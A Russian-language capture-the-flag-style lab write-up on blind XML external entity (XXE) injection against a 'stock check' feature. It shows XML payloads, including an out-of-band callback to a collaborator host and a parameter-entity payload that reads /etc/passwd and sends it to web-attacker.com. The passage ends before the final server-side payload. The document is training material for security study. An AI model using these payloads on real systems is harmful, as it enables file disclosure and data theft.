В этой лабораторной работе есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает результат.

Чтобы решить лабораторную работу, извлеките содержимое файла `/etc/hostname`.

## Дано

уязвимость  функция «Проверка запасов»
не отображает результат инъекция

## Задача

извлеките содержимое файла `/etc/hostname`.

# Решение

- Запросов
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

- тест dtd
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY xxe test "test> 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- "XML parsing error"

- проверим на всякий случай пинг 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY % xxe SYSTEM "https://5hnuzib2b14c93c2jujnrgghn8t0hr8fx.oastify.com"> 
	%xxe;
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- есть

- теперь формируем двойную сущность
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY % file SYSTEM "file:///etc/passwd"> 
	<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
ответ "Entities are not allowed for security reasons"

- делаем нагрузку полезную на стороне сервера
